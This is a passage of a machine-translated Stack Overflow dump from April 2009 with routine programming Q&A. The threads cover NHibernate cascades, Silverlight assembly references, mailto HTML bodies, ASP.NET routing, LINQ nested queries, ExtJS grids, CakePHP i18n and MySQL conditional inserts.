  </class>
</hibernate-mapping> 
```

这是我的例外：

```
Test method NetworkOrderManagement.Tests.DataAccess.QuickTests.QuickTest threw exception:
Distribution.Exceptions.DataAccessException: NHibernate Exception --->
NHibernate.PropertyValueException: not-null property references a null or transient valueNetworkOrderManagement.Core.OrderDetail.Order. 
```

当我在下面的测试尝试在订单仍然是瞬态时向订单添加 orderdetail 时，我得到了这个：

```
 [TestMethod]
    public void QuickTest()
    {
        myOrderRepository = NetworkOrderManagement.Data.RepositoryFactory.Instance.GetOrderRepository();
        myOrderDetailRepository = NetworkOrderManagement.Data.RepositoryFactory.Instance.GetOrderDetailRepository();
        myOrder = new Order { StoreNumber = RandGen.LittleRand(), Department = RandGen.LittleRand(), TransmissionDate = DateTime.MinValue, ExtractTime = DateTime.MinValue, ReceivedTime = DateTime.MinValue };
        myOrder = myOrderRepository.Save(myOrder);

        myOrderDetail1 = new OrderDetail {OrderId = myOrder.OrderId, ItemNumber = RandGen.BigRand(), OrderQuantity = RandGen.LittleRand() };
        myOrderDetail2 = new OrderDetail {OrderId = myOrder.OrderId, ItemNumber = RandGen.BigRand(), OrderQuantity = RandGen.LittleRand() };
        myOrderDetail1 = myOrderDetailRepository.Save(myOrderDetail1);
        myOrderDetail2 = myOrderDetailRepository.Save(myOrderDetail2);
        myOrder.OrderDetail.Add(myOrderDetail1);
        myOrder.OrderDetail.Add(myOrderDetail2);

        myOrderRepository.CommitChanges();

        myOrderDetailRepository.Delete(myOrderDetail2);
        myOrderRepository.CommitChanges();
        myOrderRepository.Delete(myOrder);
        myOrderRepository.CommitChanges();
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T13:21:15.960

在集合上指定级联，让 NHibernate 为您解决

[http://ayende.com/Blog/archive/2006/12/02/NHibernateCascadesTheDifferentBetweenAllAlldeleteorphansAndSaveupdate.aspx](http://ayende.com/Blog/archive/2006/12/02/NHibernateCascadesTheDifferentBetweenAllAlldeleteorphansAndSaveupdate.aspx)

[http://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html/example-parentchild.html](http://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html/example-parentchild.html)

好的，我看到你已经做到了。:) 你没有做的是指定反向引用。我的意思是：您将一个项目添加到您的收藏中，但是这个添加的项目对其所有者具有一个您尚未设置的属性：

```
Order o = new Order();

OrderDetail detail = new OrderDetail ();

detail.Order = o;
o.OrderLines.Add (detail); 
```

更好的（恕我直言）是这个（简化）：

```
public class Order
{
    private IList<OrderDetail> _details = new List<OrderDetail>();

    public ReadOnlyCollection<OrderDetail> Details
    {
       return new List(_details).AsReadOnly();
    }

    public void AddOrderLine( OrderDetail d )
    {
        d.Order = this;
        _details.Add (d);
    }

    public void RemoveOrderLine( OrderDetail d )
    {
        _details.Remove (d);
    }
} 
```

# asp.net-mvc - Upgrade MVCMembership to 1.0?

> ID：721373
> 
> 赞同：1
> 
> 时间：2009-04-06T13:13:47.677
> 
> 标签：asp.net-mvc

Does anyone know if there is a version of [MVCMembership](http://www.codeplex.com/mvcmembership) that works with MVC 1.0?

The existing code doesn't work properly with this release. Alternatively, would anyone be willing to help upgrade the code-base?

(**edit** to draw out the key points)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:33:10.390

我是 MvcMembership 项目的创建者，我正在项目网站上解决这个问题：

[http://mvcmembership.codeplex.com/Thread/View.aspx?ThreadId=52251](http://mvcmembership.codeplex.com/Thread/View.aspx?ThreadId=52251)

请关闭这个问题，因为我认为在 CodePlex 上确实更适合解决这个问题。

特洛伊

# .net - 如何在 Silverlight 应用程序中使用非 Silverlight 程序集？

> ID：721375
> 
> 赞同：12
> 
> 时间：2009-04-06T13:14:02.343
> 
> 标签：.net, silverlight, silverlight-2.0

我正在从事一个项目（纯粹的爱好，“提高我的技能”），它有一个统一的后端和多个前端（ASP.NET MVC 1.0/JQuery 和 Silverlight 2）。当我尝试在 Silverlight 2 项目（VS2008）中添加对我的业务层程序集的引用时；它被拒绝，因为它不是 Silverlight 程序集。

他们是在 Silverlight 应用程序中包含和引用非 Silverlight 程序集的一种方式吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-04-06T13:17:53.097

不，那里没有。Silverlight 在与普通（桌面）CLR 不兼容的完全不同的 CLR 上运行。它在 BCL 中有一组不同的底层 API，最重要的是不同的元数据版本号。这两个因素以及其他因素会阻止为桌面 CLR 编译的程序集默认情况下在 Silverlight CLR 上运行。

所有程序集都必须专门为 silverlight 编译。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-07T11:39:38.783

实际上，虽然这很困难并且可能不是一个好主意，**但可以在 Silverlight 项目中引用 CLR 程序集**。David Betz 在他的博客上有一个例子：http: [//www.netfxharmonics.com/2008/12/Reusing-NET-Assemblies-in-Silverlight](http://www.netfxharmonics.com/2008/12/Reusing-NET-Assemblies-in-Silverlight)

再次值得强调的是，您可能并不想这样做。Silverlight 框架是由经验丰富的工程师开发的，他们对应该包含哪些内容和不应该包含哪些内容进行了大量思考。考虑一下您认为需要的 CLR 对象，并尝试了解它们当前不可用的原因以及替代方案是什么。

最后，请记住，您添加的任何 CLR 对象都会增加下载的大小。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-04-06T13:19:03.220

不，不可能引用不是针对 Silverlight 运行时构建的程序集。

我解决它的方法是为我的业务程序集创建一个新项目，然后将原始程序集中的所有类添加到它。关键是当您将它们添加为现有项目并在添加按钮上单击向下箭头并添加为链接时。这样，您仍然只有一个代码库，尽管您可能必须添加一些类（例如 ApplicationException）来弥补 Silverlight 运行时中缺少的东西。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T13:20:14.807

简短的回答是否定的，恐怕。Silverlight 运行时被设计为 .NET 框架的一个子集，但两者并不直接兼容。（我相信，运行时的实现方式完全不同，因为 Silverlight 被设计为跨平台的。）

然而，好消息是您有很多解决方法。[这篇博](http://pagebrooks.com/archive/2008/10/11/sharing-code-between-.net-and-silverlight-platforms.aspx)文和[这篇 CodeProject](http://www.codeproject.com/KB/silverlight/SLAssemblies.aspx)文章深入讨论了这个问题，并提供了各种干净的解决方案。希望有帮助...

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T13:22:38.203

不，源 csproj 必须知道它是 Silverlight 项目。这可能意味着让两个项目文件具有相同的源“.cs”文件。这里有一个方便的 csproj 技巧 - （从我为多个框架执行此操作的[protobuf-net](http://code.google.com/p/protobuf-net/source/browse/trunk/protobuf-net_Silverlight/protobuf-net_Silverlight.csproj)复制）：

```
<ItemGroup>
    <Compile Include="..\YourMainProject\**\*.cs" />
</ItemGroup> 
```

那么你只需要维护一个项目；Silverlight 项目从树中获取所有内容。

请注意，Silverlight BCL 受到严格限制，并非所有功能都可用。获取可在常规 .NET 和 Silverlight 上编译的代码可能是……具有挑战性的。

或者，在 Silverlight 应用程序中使用代理类（即通过 WCF 等）。没有那么丰富，但做起来很简单。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2010-04-30T00:11:20.050

提醒一句，我在这方面的经验来自于为 Windows Phone 7 开发，所以这可能与普通的 Silverlight 3 略有不同。

JaredPar 指出 Silverlight CLR 与普通 CLR 不兼容。这不是 100% 正确的，因为编译为 Windows 库的程序集仍然可以在 silverlight 下工作，前提**是它们使用受支持的 API。**您可以手动编辑 silverlight 项目并添加对普通 .NET 程序集的引用。请注意，您只能添加对已编译程序集的引用，而不能添加对项目的引用。

Silverlight 应用程序将编译并运行，但一旦它尝试使用 Silverlight 中不存在的类，就会出现运行时错误。

要演示 API 的差异，请查看以下屏幕截图。如您所见，这两个程序集有一些通用 API，但 Silverlight 缺少一些。一旦您的程序集尝试使用这些 API，应用程序就会繁荣！

完整的 .NET 4.0 mscorlib（`System.serialization`命名空间）：

[完整的 .NET 4.0 mscorlib http://img188.imageshack.us/img188/2131/fullmscorlib.png](http://img188.imageshack.us/img188/2131/fullmscorlib.png)

Silverlight 3 mscorlib（`System.serialization`命名空间）：

[Silverlight 3 mscorlib http://img526.imageshack.us/img526/4254/sl3mscorlib.png](http://img526.imageshack.us/img526/4254/sl3mscorlib.png)

链接完整的 .NET 程序集的缺点是直到运行时才知道哪些 API 不受支持。考虑到某些受支持的系统 API 可能会使用不受支持的系统 API，因此没有简单的方法可以提前解决这个问题。

您可以采取一些措施来简化并行开发。Microsoft 推荐的方法是为 .NET 和 Silverlight 提供共享相同源代码的单独项目。您可以通过将文件作为链接添加到项目来手动完成。这有点像维护噩梦，但至少大多数错误会在编译时被捕获。

因此，现在当您编译引用 Silverlight 中缺少的 API 的内容时，您会收到错误消息：

```
public class SerializableExample: IEquatable<string>, System.Runtime.Serialization.ISerializable
{
} 
```

> 错误 CS0234：命名空间“System.Runtime.Serialization”中不存在类型或命名空间名称“ISerializable”（您是否缺少程序集引用？）

借助条件编译（a-la good ol' C/C++ days），您可以禁用不受支持的内容：

```
public class SerializableExample: IEquatable<string>
#if !SILVERLIGHT
  , System.Runtime.Serialization.ISerializable
#endif
{
} 
```

Microsoft 还提供了一个项目链接器工具，该工具允许自动维护具有链接文件的项目。不幸的是，当前版本不能在 VS2010 上运行，您可能可以编译源代码并实现它，但我没有尝试过。

[http://msdn.microsoft.com/en-us/library/dd458870.aspx](http://msdn.microsoft.com/en-us/library/dd458870.aspx)

直接下载链接：

[http://download.microsoft.com/download/6/3/8/6382E28D-2EBD-4A4E-BB76-6F425E1C9DB9/MicrosoftPracticesProjectLinkerFeb2009.msi](http://download.microsoft.com/download/6/3/8/6382E28D-2EBD-4A4E-BB76-6F425E1C9DB9/MicrosoftPracticesProjectLinkerFeb2009.msi)

此[Microsoft 页面](http://msdn.microsoft.com/en-us/library/ff648215.aspx)详细描述了多目标。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T16:32:25.157

Silverlight 运行时是主 .Net CLR 的子集。虽然这看起来很痛苦，但它有一个合理的原因 - Silverlight 运行时需要足够轻才能成为浏览器插件。

如果您将其他类放在 Web 服务后面，那么它们可以在完整的 .Net 运行时下运行，而您的 Silverlight 应用程序在浏览器插件中的精简 CLR 下运行。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2010-07-13T20:37:01.893

你试过这个吗？它可以通过右键单击 .NET 库项目直接构建 Silverlight 程序集。

[http://buildassiverlight.codeplex.com/](http://buildassilverlight.codeplex.com/)

# javascript - Prefill an email with HTML content

> ID：721377
> 
> 赞同：5
> 
> 时间：2009-04-06T13:14:35.867
> 
> 标签：javascript, html

I've been working on a project with a feature so that when I click a button, Outlook will open and the corresponding value stored in a variable will be in the in the body of the mail. I've tried the following code:

```
<html>
<head>
    <title>Email This Code Snippet</title>
    <script language="javascript">
    function TriggerOutlook()
    {         
        var sub = "Hi friend";
        var bodycont = "<html><body>welcome</body></html>";
        var body = escape(bodycont + String.fromCharCode(13));        
        window.location.href = "mailto:sakthivela@yahoo.com"
                             + "?body=" + body
                             + "&subject=" + sub
        ;                
    }    
</script>
</head>
<body>
<form id="form1">
    <a href="#" onclick="TriggerOutlook()">Email this Codesnippet</a>
    <input type="text" name="txtbody" id="txtbody">
</form>
</body>
</html> 
```

But the body of the mail is `<html><body>welcome</body></html>` in plain text, not HTML. How do I get it formatted as HTML?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T13:47:23.573

你不能。[mailto 规范](http://www.ianr.unl.edu/internet/mailto.html)对浏览器调用的电​​子邮件客户端没有那种控制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:59:08.660

有趣的是，当 Thunderbird 是默认的系统邮件程序时，您的代码对我有效。显然，Thunderbird 足够聪明，可以注意到正文以 HTML 邮件模式开始`<html>`并切换到 HTML 邮件模式。

乍一看，为了说服 Outlook 做出类似的行为，您可能会尝试将`Content-Type`电子邮件中的标题设置为“text/html”。但是，我看不出使用 mailto 是如何实现的，因为您无法控制标题。

# database - 有没有比较好的参考卡可以并排比较 T-SQL 和 PL/SQL？

> ID：721380
> 
> 赞同：2
> 
> 时间：2009-04-06T13:15:13.493
> 
> 标签：database, postgresql, dml

我正在寻找一个很好的参考卡/备忘单，它可以并排比较 T-SQL 和 PL/SQL 数据操作语言命令。

我之前搜索过 SO，但没有任何较旧的线程涵盖这个特定主题，所以我认为开始一个是个好主意，因为如果你碰巧在两种技术都使用的环境中工作，这样的参考几乎是强制性的共存。

提前非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T13:20:16.273

[这](http://troels.arvin.dk/db/rdbms/)很不错。在 ye olde paper 和 inke[中，简而言之 SQL](http://oreilly.com/catalog/9781565927445/)也很有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:20:40.267

我发现这个[PDF](http://www.seouc.com/Presentations/OraclevsMSSQLSyntaxExamples.pdf)详细介绍了两者之间的语法示例：

注意：PDF 来自 2003，因此它可能不会更新到最新的 SQL Server 2005 或 2008 的新功能（例如 RowNum() 函数）。

# skype - Implementing an emergency alert with Skype?

> ID：721386
> 
> 赞同：0
> 
> 时间：2009-04-06T13:15:46.627
> 
> 标签：skype, phone-call, alerts

For a system I'm working on I need to call a list of Phone numbers programatically when something breaks. Basically a simple phone based alert system, and am guessing it could be done with Skype, but I'm wondering if anyone has experience doing this, Skype or not.

Anyways links and or tutorials would be great help.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T13:21:47.423

I would go with sms. You can have a clearer error's message than skype's phone generated with robotic voice :)

Just search google with "sms gateways", for the operator's list. Almost all of them give api and code examples for interfacing.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:21:09.470

You might consider a system like [Twilio](http://www.twilio.com/) instead. Try the demo account (1000 free minutes) - it's very powerful and easy to set up.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T14:21:06.330

您可以使用任何其他 VoIP 系统进行操作；将其与 SIP 或 XMPP 网络一起破解应该相当容易，因为它们是许多平台可用的库的标准。

但是 Skype 是一个封闭的网络，有一个封闭的（并且受到严格保护的）二进制客户端。即使您确实设法弄清楚如何与它进行互操作（并且许多都失败了），他们也可以更新客户端代码以将您拒之门外。Skype 一点也不好玩。

目前你能做到的最好的办法就是使用[UI 自动化](http://en.wikipedia.org/wiki/Microsoft_UI_Automation)来模拟与真实 Skype 客户端的交互。（糟糕。）

# managed - 尝试使用托管 C++ 包装本机 C++ 类时，我得到 LNK2028

> ID：721387
> 
> 赞同：6
> 
> 时间：2009-04-06T13:16:36.110
> 
> 标签：managed, managed-c++

尝试使用托管 c++ 类包装本机 cpp 类。

一切看起来都不错，但由于某种原因它不会编译。

得到以下链接器错误：

错误 25 错误 LNK2028：未解析的令牌 (0A0002CE) 错误 27 错误 LNK2019：未解析的外部符号

任何想法如何解决这个问题？:\

好吧，这是其中一个功能的完整错误：

错误 20 错误 LNK2028：未解析的令牌 (0A0002CF) “public: bool __thiscall RCSclient::ResumeChannel(char *,int,__int64)” (?ResumeChannel@RCSclient@@$$FQAE_NPADH_J@Z) 在函数“public: bool __clrcall RCSClientWrapper”中引用::RCSclientWrapper::ResumeChannel(class System::String ^,int,class System::DateTime ^)" (?ResumeChannel@RCSclientWrapper@RCSClientWrapper@@$$FQ$AAM_NP$AAVString@System@@HP$AAVDateTime@4@ @Z) RCSClientWrapper.obj RCSClientWrapper

试图添加 user32.lib 没有结果..

提供

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T13:21:50.077

C++/CLI 允许您随意混合原生 C++，但使用 C++/CLI 会使您的应用程序依赖于 .NET 框架。

原因是您的 C++/CLI 项目在链接器输入中没有设置一些库（例如 user32.lib），因为 .NET 框架已经提供了类似的服务，并且 IDE 假定您更喜欢那些较旧的服务，本土的。

检查您的项目并添加对相应库的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-06-16T12:17:38.523

也许您在本地 C++ 标头函数声明中忘记了一个虚拟关键字，以便从托管包装器调用！？

# asp.net - Asp.Net System.Web.Routing 查找实际的 .aspx 页面

> ID：721392
> 
> 赞同：5
> 
> 时间：2009-04-06T13:19:44.590
> 
> 标签：asp.net, routing, system.web.routing

我正在使用 System.Web.Routing 来获得一些更好的 URL，但遇到了问题。我需要知道处理请求的实际页面。

例如一个请求进来：

```
/basketball/home 
```

我需要找到处理该请求的页面，例如：

```
/management/default.aspx 
```

我只使用 System.Web.Routing 而不是 MVC。我有一个包含一些路由信息的 RequestContext 句柄，但我看不到我需要什么。

提前致谢。

******* 更新 *******

我能够使用**Context.CurrentHandler**给我**"ASP.management_default_aspx"**，不完全是页面，但足以获得页面名称。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-18T08:04:12.717

实际上还有另一种简单的方法来获取实际页面：

`String vPath = ((System.Web.Routing.PageRouteHandler)Page.RouteData.RouteHandler).VirtualPath`
不要忘记检查 Page.RouteData.RouteHandler 不为空 - 当您直接获取没有 ASP.Net 路由的页面时。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T13:28:02.200

您不能从当前的 HttpContext 对象中检索它吗？

也许是这样的：

```
public string GetCurrentPageName() 
{ 
    string sPath = System.Web.HttpContext.Current.Request.Url.AbsolutePath; 
    System.IO.FileInfo oInfo = new System.IO.FileInfo(sPath); 
    string sRet = oInfo.Name; 
    return sRet; 
} 
```

更新：
你试过这篇文章吗？

[如何：从路由构造 URL](http://msdn.microsoft.com/en-us/library/cc668176.aspx)

您应该能够从您构建的路由表中检索它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-09T02:44:09.670

vhinn 可怕的答案有效......

```
Page.AppRelativeVirtualPath 
```

您只需删除初始波浪号（“~”），就可以开始了。

```
var path = Page.AppRelativeVirtualPath.Replace("~", String.Empty); 
```

我不知道为什么它被否决了。像魅力一样为我工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-14T03:30:36.040

尝试使用此代码：

```
Page.AppRelativeVirtualPath 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-12-09T04:06:26.000

我能够使用 Context.CurrentHandler 给我“ASP.management_default_aspx”，不完全是页面，但足以获得页面名称。

# c# - linq 问题：查询嵌套集合

> ID：721395
> 
> 赞同：51
> 
> 时间：2009-04-06T13:20:11.577
> 
> 标签：c#, .net, linq, collections, linq-to-xml

我有一个**Question**类，它具有可以包含多个**Answers**的公共 List 属性。

我有一个问题存储库，负责从 xml 文件中读取问题及其答案。

所以我有一个问题集合（列表），每个问题对象都有一个答案集合，我想使用 Linq 查询这个问题集合以获得答案（即按其名称）。我不知道如何正确地做到这一点。

我可以用 foreach 来做，但我想知道是否有纯 Linq 方式，因为我正在学习它。

* * *

## 回答 #1

> 赞同：91
> 
> 时间：2009-04-06T13:24:41.507

去寻找答案。

```
questions.SelectMany(q => q.Answers).Where(a => a.Name == "SomeName") 
```

找到答案的问题。

```
questions.Where(q => q.Answers.Any(a => a.Name == "SomeName")) 
```

事实上，您将获得答案或问题的集合，您必须使用`First()`、`FirstOrDefault()`、`Single()`或`SingleOrDefault()`根据您的需要来获得一个特定的答案或问题。

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2009-04-06T13:23:55.470

```
from question in Questions
from answer in question.Answers
where answer.Name == something
select question // or select answer 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-04-06T13:24:58.383

使用 SelectMany 和 First/FirstOrDefault （如果您需要一个值）

```
List<Questions> questions = //initialization;
var someAnswer = questions.SelectMany(q=>q.Answers)
                          .First(a=>a.Name =="MyName"); 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-04-06T13:26:10.190

看来你可以使用这样的东西：

```
var query = from q in questions
            from a in q.Answers
            where a.Name == "Answer Name"
            select a; 
```

# browser - WebBrowser Control: Is there a good documentation on browsing local files and folders?

> ID：721398
> 
> 赞同：0
> 
> 时间：2009-04-06T13:20:22.000
> 
> 标签：browser, directory, local

I am using the WebBrowser control to browse local files and folders, but the control seems to be designed primarily to browse the Web (as its name implies).

I need to be able to do common tasks, like using the "Up one level" button, or put the control in "File Search" mode, get the active item, etc.

Is there a way to do these things using this control? Is there a comprehensive documentation somewhere to explain local browsing using the WebBrowser?

Thanks all.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-07T01:00:02.473

I think you may be confusing the WebBrowser control with Windows Explorer.

If you want to browse around your local file system, then you need to add an Open File Dialog to the form containing the Web Browser control, then have a button of some kind open that dialog to locate the file to load into the WebBrowser control.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T13:27:00.877

Here is a [good intro](http://www.cs.tut.fi/~jkorpela/forms/file.html) that should help you get started on this. Most of the work with this dialog will be done by the browser, you need only to prompt it how to open the dialog.

# javascript - extJS - 无法获取要在 GridPanel 中呈现的数据

> ID：721410
> 
> 赞同：0
> 
> 时间：2009-04-06T13:22:29.780
> 
> 标签：javascript, gridview, extjs

下面的代码用于`Ext.data.Store`检索带有表元数据（用于列标题）和表数据的 JSON。后端 PHP 脚本工作正常，并且`Ext.data.Store`包含有效的数据记录——我只是无法让它们“进入”网格本身。

API 文档看起来好像我只是定义了一个`store`属性`Ext.grid.GridPanel`，它会处理其余的。

*注意：下面的代码与应用程序的其余部分是分开的。我们已经将这部分提取出来，看看我们是否可以让网格正常工作，而不受应用程序其余部分的影响。*

```
Ext.BLANK_IMAGE_URL = 'js/ext/resources/images/default/s.gif';
Ext.onReady(function() {
    var columns = [];
    var fields = [];

    var tabPanel = new Ext.TabPanel({
        renderTo: Ext.getBody(),
        activeTab: 0,
        height: 700
    });

    var queryHeaders = Ext.data.Record.create([
        {name: 'id'},
        {name: 'table'},
        {name: 'field'},
        {name: 'title'}
    ]);

    var applicationStore = new Ext.data.Store({
        autoLoad: true,
        reader: new Ext.data.JsonReader({root: 'fields'}, queryHeaders),
        url: 'http://localhost/aargh/index.php/applications/hardware',
        listeners: {
            'load': function() {
                console.info(applicationStore);
                applicationStore.each(function(r) {
                    this_column = [];
                    this_column['header'] = r.data['title'];
                    this_column['dataIndex'] = r.data['id'];
                    columns.push(this_column);
                    this_column = []
                    this_column['name'] = r.data['id'];
                    fields.push(this_column);
                });

                console.info(fields);
                var queryFields = Ext.data.Record.create([fields]);

                var queryStore = new Ext.data.Store({
                    autoLoad: true,
                    reader: new Ext.data.JsonReader({root: 'fields'}, queryFields),
                    url: 'http://localhost/aargh/index.php/query/execute/applications/hardware',
                    listeners: {
                        'load': function() {
                            console.info(queryStore);
                            tabPanel.add(new Ext.grid.GridPanel({
                                title: 'Hardware',
                                store: queryStore,
                                columns: columns,
                                autoHeight: true,
                                frame: true
                            }));
                            tabPanel.doLayout();
                        }
                    }
                }); 
            }
        }
    }); 
}); 
```

当我在 Firebug 中查看`applicationStore`and`queryStore`对象时，我可以完美地看到预期的数据结果，`applicationStore.data.items.#.json`并且`queryStore.data.items.#.json`（当然，将 # 替换为记录号）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:47:56.503

哇 - 这已经给我们带来了三天的麻烦。原来我是在一个数组中创建一个数组`var queryFields = Ext.data.Record.create([fields]);`

将其更改为：`var queryFields = Ext.data.Record.create(fields);`修复了问题。

# c# - dat idx 文件数据库识别

> ID：721420
> 
> 赞同：0
> 
> 时间：2009-04-06T13:24:11.273
> 
> 标签：c#, .net, database, odbc, oledb

我在一个目录中有一些 .dat 和 .idx 文件和一个 .sup 文件，我想知道是否有任何工具或 .net 编程技术来找出什么类型的数据库？

我不知道这是否有帮助，但如果我将一个 .dat 文件作为文本文件打开，我会得到：0~0904021846460509040218464605>ÀÀX2Ü

而所有 .dat 文件的共同部分，是开头 0~09040218 的以下字符串。

你能帮我一把吗？非常感谢。亲切的问候。何塞马。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T14:01:14.397

Linux 有一个[文件](http://linux.die.net/man/1/file)命令，它使用[幻数](http://linux.die.net/man/5/magic)列表来尝试识别文件类型。有一个[Win32 端口](http://gnuwin32.sourceforge.net/packages/file.htm)- 但我不能保证。就个人而言，我会将它转交给 Linux 系统并在那里运行。

# cakephp - 如何在 CakePHP 中使用多个 po 文件？

> ID：721424
> 
> 赞同：2
> 
> 时间：2009-04-06T13:25:05.437
> 
> 标签：cakephp, internationalization

我刚刚开始在 CakePHP 中探索 i18n 的过程，我似乎无法找到允许我使用多个 po 文件的文件和函数的正确组合。如果我想为每一位可翻译文本使用一个 po 文件（default.po），那效果很好，但我发现它很快就会变成一个无法维护的毛球。我已经阅读了文档和我能找到的几篇文章，但除了简单地使用一个 .po 文件之外，没有人真正深入了解 i18n。

这是我现在的位置：

*   我已经“烘焙”了我的 po 模板（.pot 文件）并将它们复制到 app/locale/eng/LC_MESSAGES 中（我不会使用默认文本作为键，以便我可以轻松发现丢失的键）。现在，我有 -views-layouts-default.po 和 -views-pages-index.po。
*   在那些 .po 文件中，我输入了我想为每个键使用的文本。
*   在我的主页 (views/pages/index.ctp) 和默认布局 (views/layouts/default.ctp) 中，我使用 __() 函数包装了我想要翻译的文本键。

但是，当我加载主页时，我看到的只是它们的键。没有文字被翻译。但是，如果我抛出一个 default.po 文件，那么我放入的任何键都可以很好地填充。我显然错过了一些拼图，但我找不到它。任何帮助将非常感激。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T18:57:58.630

感谢 CakePHP Google Group，我找到了我丢失的部分。我一直在使用 __d() 便利功能，但没有清楚地了解如何将它与我的 .po 文件绑定在一起。知道后答案很简单：

领域翻译：

```
__d ( 'login', 'PLEASE_LOGIN' );
```

将在名为 login.po 的文件中查找“PLEASE_LOGIN”键。我不知道（也没有在任何地方读过） domain == po 文件名（没有扩展名）。学习让一切变得不同。

# clearcase - 仅列出 CCRC 视图

> ID：721433
> 
> 赞同：1
> 
> 时间：2009-04-06T13:27:00.267
> 
> 标签：clearcase, clearcase-remote-client

谁能想到一种快速、简单且完全可靠的方法来仅列出来自 UNIX 的 ClearCase Remote Client 视图？

**ct lsview 显然列出了所有视图，如果你运行ct lsview -properties -full**（给你*Properties: snapshot webview readwrite* ）然后使用正则表达式或其他东西，你可以通过查看 Properties: 部分进行搜索，但我会担心有人称他们的观点为“webview”之类的。

有没有人有万无一失的方法？我错过了一面旗帜还是什么？如果 lsview 上有 -fmt 就好了：S

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:33:47.410

检测“webview readwrite”的正则表达式应该足够好了。

但更简单的是，我们的 CCRC 服务器运行到它自己的 ClearCase 区域（例如“web”）。

所以在我们的例子中：“仅列出来自 UNIX 的 ClearCase Remote Client 视图”？

```
ct lsview -reg web 
```

# mysql - inserting records in a MySQL table depending on existing values in another table

> ID：721435
> 
> 赞同：0
> 
> 时间：2009-04-06T13:27:13.730
> 
> 标签：mysql, insert, concat

I am using MySQL. I want to insert some records in a table provided that they do not exist in another table. So I want to perform something like this:

```
INSERT INTO sales (name, id)
SELECT name, id FROM sales_h 
WHERE name AND id NOT IN (SELECT name, id FROM T_sales); 
```

The problem is that MySQL does not allow this kind of syntax (something to do with the where clause...) I tried using CONCAT but with no result.

Any clue??

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:31:19.413

```
INSERT
INTO    sales (name, id)
SELECT  name, id
FROM    sales_h
WHERE  (name, id) NOT IN
       (
       SELECT name, id
       FROM t_sales
       ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:33:14.260

您是否尝试过**EXISTS** [语法](http://dev.mysql.com/doc/refman/5.0/en/exists-and-not-exists-subqueries.html)？

```
INSERT INTO sales (name, id) 
SELECT name, id 
FROM sales_h 
WHERE NOT EXISTS (SELECT * FROM T_sales WHERE T_sales.name = sales_h.name AND T_sales.id = sales_h.id); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T13:51:47.167

MySQL 允许您像变量一样使用元组：

这是你的声明：

```
INSERT INTO sales (name, id)
SELECT name, id FROM sales_h 
WHERE name AND id NOT IN (SELECT name, id FROM T_sales); 
```

问题是“姓名和身份证”。把它变成一个元组：

```
INSERT INTO sales (name, id)
SELECT name, id FROM sales_h 
WHERE (name, id) NOT IN (SELECT name, id FROM T_sales); 
```

就个人而言，我不太喜欢这个有两个原因：元组作为变量在其他 RDBMS 上不起作用（或工作方式不同），并且 IN 在许多情况下往往表现不佳，所以我喜欢养成不做的习惯用于。

正如 jhonny-d-cano-leftware 所说（我已经升级了他），我会使用 where not exists ：

```
INSERT INTO sales (name, id)
SELECT name, id FROM sales_h a
WHERE not exists (
 SELECT * 
 FROM T_sales b 
 where b.id = a.id and b.name = a.name); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:30:41.070

您可能会查看`ON DUPLICATE`MySql 的子句

[http://dev.mysql.com/doc/refman/5.1/en/insert-select.html](http://dev.mysql.com/doc/refman/5.1/en/insert-select.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T13:30:54.157

你不能说 WHERE name AND id NOT IN... 你需要为每个单独的子句。但是你有 id 作为表 T_sales 中的主键吗？如果是这样，那么这就是您需要检查的所有内容，例如：

```
INSERT INTO sales (name, id) 
(SELECT name, id FROM sales_h WHERE id NOT IN (SELECT id FROM T_sales)); 
```

编辑

嗯，从其他人的回答来看，最好忽略我，因为他们似乎知道更多:-)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T13:31:30.413

问题是你的 WHERE。

它不像你那样阅读。您将其读作“WHERE (name and id) NOT IN (...)”，而将其读作“WHERE name (isn't null) AND (id NOT IN (...))”.. . 如果你明白我的意思。

改成这样：`ROW(name, id) NOT IN (SELECT name, id FROM T_sales);`

* * *

## 回答 #7

> 赞同：0
> 
